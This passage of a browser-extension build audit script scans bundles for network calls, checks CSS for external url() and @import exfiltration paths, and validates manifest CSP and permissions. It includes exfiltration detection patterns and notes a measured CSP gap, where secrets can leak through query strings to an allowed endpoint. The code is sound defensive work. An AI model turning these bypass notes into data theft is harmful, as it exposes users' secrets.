    // ── MemberExpression: globalThis.fetch, window.WebSocket ────────
    // Catches property access on known global carriers
    MemberExpression(path) {
      if (path.node.computed) return;
      if (path.node.property.type !== "Identifier") return;

      const prop = path.node.property.name;
      if (!DANGEROUS_GLOBALS.has(prop)) return;

      // Skip if parent is already a CallExpression (handled above)
      const parent = path.parent;
      if (parent.type === "CallExpression" && parent.callee === path.node)
        return;

      const obj = path.node.object;
      // Only flag on known global carriers
      if (
        obj.type === "Identifier" &&
        (obj.name === "globalThis" ||
          obj.name === "window" ||
          obj.name === "self")
      ) {
        addFinding("ref", prop, path, `${obj.name}.${prop}`);
      }
    },
  });

  // Resolve each call/import destination once, while the paths are live.
  for (const f of findings) {
    if (f.kind !== "call" && f.kind !== "dynamic-import") continue;
    if (!f.path) continue;
    const arg = f.path.get("arguments")[0];
    f.resolved = resolveStatic(arg, new Map(), 0, new Set());
    f.resolvedOrigin = originOf(f.resolved);
    if (f.kind === "call" && f.name === "fetch")
      f.init = readInitObject(f.path);
    f.path = null; // don't retain the AST
  }

  return { findings, parseError: null };
}

// ── CSS scanner ─────────────────────────────────────────────────────
// Catches exfiltration via url(), @import, @font-face pointing externally.
// CSP img-src/font-src blocks these at runtime, but we flag them at build
// time too so a malicious dep can't rely on a future CSP loosening.
const EXTERNAL_URL_RE = /url\(\s*["']?(https?:\/\/|\/\/)/gi;
const IMPORT_RE = /@import\s+(?:url\()?["']?(https?:\/\/|\/\/)/gi;

function scanCssFile(source, relPath, contextOf) {
  const findings = [];

  for (const re of [EXTERNAL_URL_RE, IMPORT_RE]) {
    re.lastIndex = 0;
    let match;
    while ((match = re.exec(source)) !== null) {
      const start = Math.max(0, match.index - 20);
      const end = Math.min(source.length, match.index + match[0].length + 80);
      findings.push({
        file: relPath,
        context: contextOf(relPath),
        kind: "css-url",
        name: "external-url",
        detail: "external URL in CSS",
        start: match.index,
        end: match.index + match[0].length,
        snippet: source.slice(start, end),
      });
    }
  }
  return findings;
}

// ── Manifest / HTML validator ───────────────────────────────────────
// Ensures the built manifest.json still carries the policy the audit
// story rests on. A malicious build plugin could strip or weaken any of
// it, and a generated manifest is exactly the kind of file a reviewer
// skims rather than reads.
function validateManifest(outputDir, manifest) {
  const errors = [];
  if (!manifest) return ["manifest.json not found or invalid"];

  const cspBlock = manifest.content_security_policy ?? {};
  const csp = cspBlock.extension_pages ?? "";

  // Each directive must contain at least one of the acceptable tokens.
  // 'none' is strictly stronger than 'self' and always acceptable.
  const required = [
    ["default-src", ["'self'", "'none'"]],
    ["script-src", ["'self'"]],
    ["img-src", ["'self'", "'none'"]],
    ["font-src", ["'self'", "'none'"]],
    ["worker-src", ["'self'", "'none'"]],
    ["frame-src", ["'none'"]],
    ["form-action", ["'none'"]],
    ["object-src", ["'self'", "'none'"]],
  ];

  const escape = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  for (const [directive, values] of required) {
    const matched = values.some((v) =>
      new RegExp(`${directive}\\s+[^;]*${escape(v)}`).test(csp),
    );
    if (!matched) {
      errors.push(
        `Missing or wrong: ${directive} must include one of ${values.join(", ")}`,
      );
    }
  }

  // connect-src must be EXACTLY the extension origin plus the two
  // path-prefixed lookup endpoints, in this order. Not a substring test:
  // `'self' https://api.github.com/` (no path) or a third origin appended
  // would both pass a containment check and both widen the worker's
  // reach.
  //
  // CSP path-prefix matching is real and was measured: with this policy
  // /users/<u>/keys returns 200 and /gists is blocked. What it does NOT
  // constrain is the query string — /users/x/keys?leak=SECRET is allowed
  // (measured). That residual is inherent to CSP and is recorded as
  // T-GITHUB-CSP-SCOPE rather than papered over here.
  const EXPECTED_CONNECT_SRC = [
    "connect-src 'self'",
    ...WORKER_ORIGINS.map((o) => `${o}${CONNECT_SRC_PATHS[o]}`),
  ].join(" ");
  const connectDirective = csp
    .split(";")
    .map((d) => d.trim().replace(/\s+/g, " "))
    .find((d) => d.startsWith("connect-src"));
  if (connectDirective !== EXPECTED_CONNECT_SRC) {
    errors.push(
      `connect-src must be exactly "${EXPECTED_CONNECT_SRC}", got ${
        connectDirective === undefined ? "(absent)" : `"${connectDirective}"`
      }`,
    );
  }

  // script-src must NOT have 'unsafe-eval' (wasm-unsafe-eval is ok)
  if (
    /script-src\s+[^;]*'unsafe-eval'/.test(csp) &&
    !/script-src\s+[^;]*'wasm-unsafe-eval'/.test(csp)
  ) {
    errors.push("script-src must not include 'unsafe-eval'");
  }

  // A `content_security_policy.sandbox` entry, or a top-level `sandbox`
  // block, takes a page OUT of extension_pages entirely: a sandboxed
  // extension page runs in an opaque origin under the sandbox policy, so
  // the `connect-src` directive above simply does not apply to it. That makes either one a complete bypass of everything the
  // CSP checks above assert, which is why they are checked as keys that
  // must not exist rather than as policies to be parsed.
  for (const key of Object.keys(cspBlock)) {
    if (key !== "extension_pages") {
      errors.push(
        `content_security_policy.${key} must be ABSENT (got ${JSON.stringify(cspBlock[key])}) -- a sandboxed page is exempt from the extension_pages policy entirely`,
      );
    }
  }

  // Neither lookup needs a host permission: api.github.com and
  // keys.openpgp.org both answer unauthenticated and send
  // `access-control-allow-origin: *` (measured: 200 with
  // `x-ratelimit-limit: 60` for the former, 200 with `content-type:
  // application/pgp-keys` for the latter). So the host permission keys
  // must be ABSENT, not merely small — along with the
  // other manifest keys that can create a network path with no code in
  // the bundle at all.
  for (const [key, reason] of Object.entries(FORBIDDEN_MANIFEST_KEYS)) {
    if (key in manifest) {
      errors.push(
        `${key} must be ABSENT (got ${JSON.stringify(manifest[key])}) -- ${reason}`,
      );
    }
  }

  // The permission arrays, as exact sets. The CSP is not the only way to
  // reach the network from an extension: `declarativeNetRequest` rewrites
  // requests the page never made, `nativeMessaging` opens a pipe to a
  // local binary that no CSP covers, and `tabs`/`cookies` hand over other
  // origins' data outright. None of them add a line to the bundle, so the
  // AST census above cannot see any of them — only this can.
  for (const [key, expected] of [
    ["permissions", EXPECTED_PERMISSIONS],
    ["optional_permissions", EXPECTED_OPTIONAL_PERMISSIONS],
  ]) {
    const got = manifest[key] ?? [];
    if (!Array.isArray(got)) {
      errors.push(`${key} must be an array, got ${JSON.stringify(got)}`);
      continue;
    }
    const added = got.filter((p) => !expected.includes(p));
    const removed = expected.filter((p) => !got.includes(p));
    if (added.length > 0) {
      errors.push(
        `${key} gained ${JSON.stringify(added)} -- the set is pinned to ${JSON.stringify(expected)}; every permission here is one the extension uses, and anything else must be justified in SECURITY.md in the same commit`,
      );
    }
    if (removed.length > 0) {
      errors.push(
        `${key} lost ${JSON.stringify(removed)} -- if that removal is deliberate, update EXPECTED_${key.toUpperCase()} in scripts/audit-network.mjs in the same commit`,
      );
    }
  }

  return errors;
}

// The manifest CSP is extension-WIDE, so widening it for the worker
// widens it for the panel too. `sidepanel.html` pulls the panel realm
// back to `connect-src 'self'` with a meta CSP. Meta CSP can only
// tighten, never loosen, and the browser enforces it — this is NOT the
// same-realm hook problem of §8.10, because it is not our JS doing the
// enforcing. Verified in a real build: with the manifest widened, the
// WORKER fetch returned 200 while the same fetch from the PANEL failed.
function validatePanelHtml(outputDir) {
  const errors = [];
  try {
    const html = readFileSync(join(outputDir, "sidepanel.html"), "utf-8");
    const normalized = html.replace(/\s+/g, " ");
    const hasMeta =
      /<meta\s+http-equiv="Content-Security-Policy"\s+content="[^"]*connect-src 'self'[^"]*"/.test(
        normalized,
      );
    if (!hasMeta) {
      errors.push(
        'sidepanel.html must carry <meta http-equiv="Content-Security-Policy" content="connect-src \'self\'"> -- without it the panel inherits the worker\'s remote-origin allowances',
      );
    }
  } catch {
    errors.push("sidepanel.html not found in build output");
  }
  return errors;
}

// ── Run ─────────────────────────────────────────────────────────────
try {
  statSync(OUTPUT_DIR);
} catch {
  console.error(`ERROR: Build output not found at ${OUTPUT_DIR}`);
  console.error("       Run the build first, then re-run this script.");
  process.exit(1);
}

const structureErrors = [];

let manifest = null;
try {
  manifest = JSON.parse(
    readFileSync(join(OUTPUT_DIR, "manifest.json"), "utf-8"),
  );
} catch {
  manifest = null;
}

// The worker file comes from the manifest, but must still be the file this
// script's census was pinned against.
const workerFile =
  (manifest && manifest.background?.service_worker) || EXPECTED_WORKER_FILE;
if (workerFile !== EXPECTED_WORKER_FILE) {
  structureErrors.push(
    `manifest background.service_worker is "${workerFile}", not "${EXPECTED_WORKER_FILE}" -- the worker context moved, so EXPECTED_CENSUS and the single-file origin-literal checks must be re-derived before this audit means anything.`,
  );
}
const contextOf = (rel) => (rel === workerFile ? "worker" : "page");

// ── Decide what to scan, from the output and the manifest ───────────
const allFiles = collectFiles(OUTPUT_DIR);
const referencedScripts = new Set(manifest ? manifestScriptRefs(manifest) : []);
const referencedPages = new Set(manifest ? manifestPageRefs(manifest) : []);

// HTML pages contribute their <script src> targets to the scan set, so a
// page that loads `panel.mjs` (or `panel.bin`) is audited like any chunk.
const htmlFiles = allFiles.filter((f) => /\.html?$/i.test(f));
for (const rel of htmlFiles) {
  const html = readFileSync(join(OUTPUT_DIR, rel), "utf-8");
  for (const ref of htmlScriptRefs(html, rel)) referencedScripts.add(ref);
  for (const inline of htmlInlineScripts(html)) {
    structureErrors.push(
      `${rel} contains an INLINE <script> (${inline[1].trim().slice(0, 60).replace(/\s+/g, " ")}…) -- inline script is invisible to this audit and blocked by the extension CSP; it must not be in the build.`,
    );
  }
}

const { scripts, css, inert } = classifyFiles(allFiles, referencedScripts);
const scriptSet = new Set(scripts);

// Anything the manifest or a page says it will run must exist and be in
// the scan set. A dangling reference is either a broken build or a file
// that arrives later.
for (const ref of referencedScripts) {
  if (!scriptSet.has(ref)) {
    structureErrors.push(
      `${ref} is referenced as a script by the manifest or an HTML page but is ${allFiles.includes(ref) ? "not being scanned" : "missing from the build output"}.`,
    );
  }
}
for (const ref of referencedPages) {
  if (!allFiles.includes(ref)) {
    structureErrors.push(
      `${ref} is referenced as a page by the manifest but is missing from the build output.`,
    );
  }
}

if (scripts.length === 0) {
  console.error(`ERROR: No script files found in ${OUTPUT_DIR}`);
  process.exit(1);
}

const allFindings = [];
const urlLiterals = { worker: new Map(), page: new Map() };
/** Which built files name each permitted origin. Exactly one apiece,
 *  and it must be the worker — checked after the scan. */
const originFiles = Object.fromEntries(WORKER_ORIGINS.map((o) => [o, []]));
let workerFileSeen = false;

for (const rel of scripts) {
  const ctx = contextOf(rel);
  const source = readFileSync(join(OUTPUT_DIR, rel), "utf-8");

  const { findings, parseError } = scanFile(source, rel, contextOf);
  if (parseError) {
    structureErrors.push(
      `${rel} could not be parsed as JavaScript (${parseError}) -- every non-inert file in the output is scanned as script; if this one is data, give it an inert extension or add that extension to INERT_EXTENSIONS with a reason.`,
    );
    continue;
  }
  allFindings.push(...findings);

  for (const url of urlLiteralsIn(source)) {
    const seen = urlLiterals[ctx];
    if (!seen.has(url)) seen.set(url, []);
    if (!seen.get(url).includes(rel)) seen.get(url).push(rel);
  }

  for (const origin of WORKER_ORIGINS) {
    if (source.includes(origin)) originFiles[origin].push(rel);
  }

  if (ctx === "worker") {
    workerFileSeen = true;
    // Self-containment. lib/github/fetch-keys.ts and
    // lib/keyserver/fetch-key.ts are imported only by the background
    // entry, so Vite has no reason to hoist either into a shared chunk —
    // and this check is what makes that reasoning load-bearing instead of
    // merely likely. It is also what makes the destination resolver's
    // single-file scope sound. Deliberately NOT an import-graph walker:
    // the blunt version fails loudly the day someone imports one of those
    // modules from the panel, which is exactly the day you want to be
    // told. (`lib/net/capped-body.ts` is shared BETWEEN those two and by
    // nobody else, so it lands in the same bundle and does not weaken
    // this.)
    const specifiers = moduleSpecifiersIn(source);
    if (specifiers.length > 0) {
      structureErrors.push(
        `${rel} is no longer self-contained -- it imports ${specifiers.join(", ")}. Worker code has been split into a shared chunk, so the "one file names each permitted origin" guarantee no longer holds. Re-derive it before editing this script.`,
      );
    }
  }
}

for (const rel of css) {
  const source = readFileSync(join(OUTPUT_DIR, rel), "utf-8");
  allFindings.push(...scanCssFile(source, rel, contextOf));
}

if (!workerFileSeen) {
  structureErrors.push(
    `${workerFile} not found in the build output -- the worker context could not be audited at all.`,
  );
}

// ── Census mode: dump, don't judge ──────────────────────────────────
if (CENSUS_MODE) {
  for (const ctx of ["worker", "page"]) {
    console.log(`\n── ${ctx} ──`);
    const counts = {};
    for (const f of allFindings.filter((f) => f.context === ctx)) {
      const sig = `${f.kind}:${f.name}`;
      counts[sig] = (counts[sig] ?? 0) + 1;
      console.log(`   ${f.file}  ${sig}`);
      if (f.kind === "call" || f.kind === "dynamic-import") {
        console.log(
          `   │ destination: ${JSON.stringify(f.resolved)} origin: ${JSON.stringify(f.resolvedOrigin)}`,
        );
        if (f.init) console.log(`   │ init keys: ${f.init.keys.join(", ")}`);
      }
      console.log(`   │ ${f.snippet.replace(/\s+/g, " ").slice(0, 140)}`);
    }
    console.log(`   counts: ${JSON.stringify(counts)}`);
    console.log(
      `   urls: ${JSON.stringify([...urlLiterals[ctx].keys()], null, 2)}`,
    );
  }
  console.log(`\n── files ──`);
  console.log(`   scripts: ${JSON.stringify(scripts)}`);
  console.log(`   css:     ${JSON.stringify(css)}`);
  console.log(`   inert:   ${JSON.stringify(inert)}`);
  process.exit(0);
}

// ── Check the census, exactly ───────────────────────────────────────
const censusErrors = [];
const unexpected = [];

// Describe why a finding failed its pin, so the report says which of the
// three requirements (site, destination, init shape) was not met.
function pinFailure(f, pins) {
  const sameKind = pins.filter((p) => p.kind === f.kind && p.name === f.name);
  if (sameKind.length === 0) return "no pin for this kind of call";
  const reasons = [];
  for (const p of sameKind) {
    if (p.snippet && !f.snippet.includes(p.snippet)) {
      reasons.push(`does not match pinned site ${JSON.stringify(p.snippet)}`);
      continue;
    }
    if (p.destinationOrigin === null && f.resolvedOrigin !== null) {
      reasons.push(
        `destination resolves to the REMOTE origin ${f.resolvedOrigin}; this context may only reach extension-local URLs`,
      );
      continue;
    }
    if (typeof p.destinationOrigin === "string") {
      if (f.resolvedOrigin === null) {
        reasons.push(
          `destination could not be resolved statically (got ${JSON.stringify(f.resolved)}); the pin requires it to resolve to ${p.destinationOrigin}. Either the destination is no longer built from a literal in this file, or the bundle shape moved past what the resolver follows -- re-derive the pin, do not relax it`,
        );
        continue;
      }
      if (f.resolvedOrigin !== p.destinationOrigin) {
        reasons.push(
          `destination resolves to ${f.resolvedOrigin}, pinned to ${p.destinationOrigin}`,
        );
        continue;
      }
    }
    if (p.init) {
      if (!f.init) {
        reasons.push("fetch init is not a plain object literal");
        continue;
      }
      const allowed = new Set([
        ...Object.keys(p.init),
        ...(p.initOptionalKeys ?? []),
      ]);
      const extra = f.init.keys.filter((k) => !allowed.has(k));
      const wrong = Object.entries(p.init).filter(
        ([k, v]) => f.init.values[k] !== v,
      );
      if (extra.length > 0)
        reasons.push(`fetch init has unpinned option(s) ${extra.join(", ")}`);
      if (wrong.length > 0)
        reasons.push(
          `fetch init must set ${wrong.map(([k, v]) => `${k}:${JSON.stringify(v)}`).join(", ")} (got ${wrong.map(([k]) => `${k}:${JSON.stringify(f.init.values[k])}`).join(", ")})`,
        );
      if (extra.length > 0 || wrong.length > 0) continue;
    }
    reasons.push("matched");
  }
  return reasons.join("; ");
}

function matchesPin(f, p) {
  if (p.kind !== f.kind || p.name !== f.name) return false;
  if (p.snippet && !f.snippet.includes(p.snippet)) return false;
  if (p.destinationOrigin === null && f.resolvedOrigin !== null) return false;
  if (typeof p.destinationOrigin === "string") {
    if (f.resolvedOrigin !== p.destinationOrigin) return false;
  }
  if (p.init) {
    if (!f.init) return false;
    const allowed = new Set([
      ...Object.keys(p.init),
      ...(p.initOptionalKeys ?? []),
    ]);
    if (f.init.keys.some((k) => !allowed.has(k))) return false;
    if (Object.entries(p.init).some(([k, v]) => f.init.values[k] !== v))
      return false;
  }
  return true;
}

for (const ctx of ["worker", "page"]) {
  const expected = EXPECTED_CENSUS[ctx];
  const observed = {};
  for (const f of allFindings.filter((f) => f.context === ctx)) {
    const sig = `${f.kind}:${f.name}`;
    observed[sig] = (observed[sig] ?? 0) + 1;
  }

  for (const sig of new Set([
    ...Object.keys(expected),
    ...Object.keys(observed),
  ])) {
    const want = expected[sig] ?? 0;
    const got = observed[sig] ?? 0;
    if (want !== got) {
      censusErrors.push(
        `[${ctx}] expected exactly ${want} × ${sig}, found ${got}`,
      );
    }
  }

  // Pin every call/dynamic-import to a known site, so a leak cannot
  // occupy a legitimate call's slot in the count.
  const pins = PINNED_CALL_SITES[ctx] ?? [];
  const pinHits = pins.map(() => 0);
  for (const f of allFindings.filter(
    (f) =>
      f.context === ctx && (f.kind === "call" || f.kind === "dynamic-import"),
  )) {
    const index = pins.findIndex((p) => matchesPin(f, p));
    if (index < 0) {
      unexpected.push({ ...f, why: pinFailure(f, pins) });
    } else {
      pinHits[index] += 1;
    }
  }
  // Exact in the other direction too: a pin nobody matched is a guard that
  // has silently disappeared.
  pins.forEach((p, i) => {
    if (pinHits[i] !== 1) {
      censusErrors.push(
        `[${ctx}] pinned call site "${p.reason}" matched ${pinHits[i]} call(s), expected exactly 1`,
      );
    }
  });

  // Anything the scanner found that is not a call, an import or a ref is
  // unexpected by construction (eval, new Worker, new Function, css-url…).
  for (const f of allFindings.filter(
    (f) =>
      f.context === ctx &&
      f.kind !== "call" &&
      f.kind !== "dynamic-import" &&
      f.kind !== "ref",
  )) {
    unexpected.push(f);
  }
}

// ── Check the URL literal sets, exactly ─────────────────────────────
const urlErrors = [];
for (const ctx of ["worker", "page"]) {
  const expected = new Set(EXPECTED_URL_LITERALS[ctx]);
  const observed = urlLiterals[ctx];

  for (const [url, files] of observed) {
    if (!expected.has(url)) {
      urlErrors.push(
        `[${ctx}] UNEXPECTED absolute URL literal ${JSON.stringify(url)} in ${files.join(", ")}`,
      );
    }
  }
  for (const url of expected) {
    if (!observed.has(url)) {
      urlErrors.push(
        `[${ctx}] expected absolute URL literal ${JSON.stringify(url)} is gone -- if that was deliberate, remove it from EXPECTED_URL_LITERALS in the same commit`,
      );
    }
  }
}

// The worker's remote origin literals must be exactly the allowed set --
// as a SET, so neither a missing one nor an extra one passes.
const workerRemoteLiterals = [...urlLiterals.worker.keys()]
  .filter((u) => originOf(u) !== null)
  .sort();
const expectedRemoteLiterals = [...WORKER_ORIGINS].sort();
if (
  workerRemoteLiterals.length !== expectedRemoteLiterals.length ||
  workerRemoteLiterals.some((u, i) => u !== expectedRemoteLiterals[i])
) {
  urlErrors.push(
    `[worker] expected exactly these remote origin literals (${expectedRemoteLiterals.join(", ")}), found ${JSON.stringify(workerRemoteLiterals)}`,
  );
}

// Exactly one file in the WHOLE build may name each origin, and it is the
// worker bundle. See the self-containment check above for why a ten-line
// test is enough here.
for (const origin of WORKER_ORIGINS) {
  const files = originFiles[origin];
  if (
    files.length !== 1 ||
    files[0] !== workerFile ||
    contextOf(files[0]) !== "worker"
  ) {
    urlErrors.push(
      `${origin} must appear in exactly one built file (${workerFile}); found in ${JSON.stringify(files)}`,
    );
  }
}

// Validate the manifest and the panel's meta CSP
const cspErrors = [
  ...validateManifest(OUTPUT_DIR, manifest),
  ...validatePanelHtml(OUTPUT_DIR),
];

// ── Report ──────────────────────────────────────────────────────────
console.log("");

if (unexpected.length > 0) {
  console.log("❌ UNEXPECTED NETWORK PRIMITIVES DETECTED");
  console.log(
    "   These matched no pinned call site and may indicate a supply-chain attack.\n",
  );
  for (const f of unexpected) {
    console.log(
      `   [${f.context}] ${f.file}:${f.start}  [${f.kind}] ${f.detail}`,
    );
    if (f.why) console.log(`   │ ${f.why}`);
    const trimmed = f.snippet.replace(/\s+/g, " ").slice(0, 120);
    console.log(`   │ ${trimmed}…`);
    console.log("");
  }
}

if (censusErrors.length > 0) {
  console.log("❌ PER-CONTEXT CENSUS MISMATCH");
  console.log(
    "   Counts are exact on purpose: a removed guard fails as loudly as an added leak.\n",
  );
  for (const err of censusErrors) console.log(`   • ${err}`);
  console.log("");
}

if (urlErrors.length > 0) {
  console.log("❌ ABSOLUTE URL LITERAL MISMATCH");
  console.log(
    "   A change detector, not a proof -- a URL can still be assembled at runtime.\n",
  );
  for (const err of urlErrors) console.log(`   • ${err}`);
  console.log("");
}

if (structureErrors.length > 0) {
  console.log("❌ BUILD STRUCTURE CHANGED");
  console.log("   The audit's assumptions about the bundle no longer hold.\n");
  for (const err of structureErrors) console.log(`   • ${err}`);
  console.log("");
}

if (cspErrors.length > 0) {
  console.log("❌ MANIFEST / PANEL POLICY VALIDATION FAILED");
  console.log(
    "   The built manifest.json or sidepanel.html has been weakened.\n",
  );
  for (const err of cspErrors) console.log(`   • ${err}`);
  console.log("");
}

const workerFindings = allFindings.filter((f) => f.context === "worker").length;
const pageFindings = allFindings.filter((f) => f.context === "page").length;

console.log("── Summary ──────────────────────────────────");
console.log(`   Script files scanned:  ${scripts.length}`);
console.log(`   CSS files scanned:     ${css.length}`);
console.log(`   Inert files skipped:   ${inert.length}`);
console.log(`   worker findings:       ${workerFindings}`);
console.log(`   page findings:         ${pageFindings}`);
console.log(`   worker URL sites:      ${urlLiterals.worker.size}`);
console.log(`   page URL sites:        ${urlLiterals.page.size}`);
console.log(`   Unexpected:            ${unexpected.length}`);
console.log(`   Census errors:         ${censusErrors.length}`);
console.log(`   URL errors:            ${urlErrors.length}`);
console.log(`   Structure errors:      ${structureErrors.length}`);
console.log(`   CSP errors:            ${cspErrors.length}`);
console.log("");

const failed =
  unexpected.length +
  censusErrors.length +
  urlErrors.length +
  structureErrors.length +
  cspErrors.length;

if (failed > 0) {
  console.log("⚠️  Re-run with --census to see the observed census.");
  console.log(
    "   If the change is legitimate, update EXPECTED_CENSUS / PINNED_CALL_SITES /",
  );
  console.log(
    "   EXPECTED_URL_LITERALS in scripts/audit-network.mjs in the SAME commit,",
  );
  console.log(
    "   and say why in the message. If it is not, a dependency may be",
  );
  console.log(
    "   exfiltrating data, or a build plugin may have weakened the CSP.",
  );
  process.exit(1);
}

console.log(
  `✅ worker: ${WORKER_ORIGINS.length} fetch call sites, one per pinned destination (${WORKER_ORIGINS.join(", ")}); no other remote origin nameable.`,
);
console.log(
  "✅ page:   no code that can name a remote destination; 2 wasm loaders only.",
);
console.log(
  "✅ manifest: connect-src exact, permissions pinned, no host/sandbox keys, panel meta CSP present.",
);
